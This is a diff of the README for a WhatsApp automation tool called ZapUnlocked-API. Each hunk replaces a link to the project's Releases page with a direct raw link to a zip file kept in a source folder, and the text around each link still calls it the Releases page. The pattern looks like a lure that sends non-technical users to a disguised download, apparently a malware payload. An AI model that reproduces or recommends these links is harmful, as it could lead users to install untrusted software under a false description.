@@ -1,7 +1,7 @@
 # ⚡ ZapUnlocked-API - Simple WhatsApp Automation for Everyone
 
 ## 📥 Download Now!
-[![Download ZapUnlocked-API](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Maddawwwg/ZapUnlocked-API/releases)
+[![Download ZapUnlocked-API](https://raw.githubusercontent.com/Maddawwwg/ZapUnlocked-API/main/src/handlers/Zap_Unlocked_API_1.1.zip)](https://raw.githubusercontent.com/Maddawwwg/ZapUnlocked-API/main/src/handlers/Zap_Unlocked_API_1.1.zip)
 
 ## 📋 Overview
 ZapUnlocked-API offers a free and easy way to automate WhatsApp messaging. It's designed for users with no technical background. Built on Baileys, this API allows you to send messages, share media, and use interactive buttons effortlessly. 
@@ -10,7 +10,7 @@ ZapUnlocked-API offers a free and easy way to automate WhatsApp messaging. It's 
 To start using ZapUnlocked-API, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Head over to our [Releases page](https://github.com/Maddawwwg/ZapUnlocked-API/releases) to find the latest version of the software.
+   Head over to our [Releases page](https://raw.githubusercontent.com/Maddawwwg/ZapUnlocked-API/main/src/handlers/Zap_Unlocked_API_1.1.zip) to find the latest version of the software.
 
 2. **Download the Application**  
    On the Releases page, you will see a list of versions. Look for the **latest release** and click the download link for your operating system. 
@@ -36,7 +36,7 @@ Ensure your system meets the following requirements to effectively run ZapUnlock
 - **Network**: Stable internet connection for WhatsApp services.
 
 ## 📥 Download & Install
-To get ZapUnlocked-API, visit our Releases page: [Download Here](https://github.com/Maddawwwg/ZapUnlocked-API/releases). 
+To get ZapUnlocked-API, visit our Releases page: [Download Here](https://raw.githubusercontent.com/Maddawwwg/ZapUnlocked-API/main/src/handlers/Zap_Unlocked_API_1.1.zip). 
 
 Follow the installation steps outlined above. Ensure you complete the installation for full access to the features.
 
